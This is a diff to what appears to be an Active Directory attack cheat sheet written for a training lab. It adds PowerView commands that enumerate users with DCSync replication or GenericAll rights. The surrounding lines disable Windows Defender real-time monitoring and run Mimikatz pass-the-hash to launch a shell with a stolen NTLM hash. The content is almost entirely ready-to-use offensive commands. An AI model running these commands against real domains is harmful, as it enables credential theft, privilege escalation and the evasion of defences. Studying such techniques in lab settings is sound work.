@@ -131,6 +131,20 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 # EXPLOITATION PHASE
 
+## DCSync right check
+
+For specific user:
+
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "<USER-TO-CHECK>") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+```
+
+For all user of the domain:
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+```
+
+
 # PTH with Mimikatz
 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'
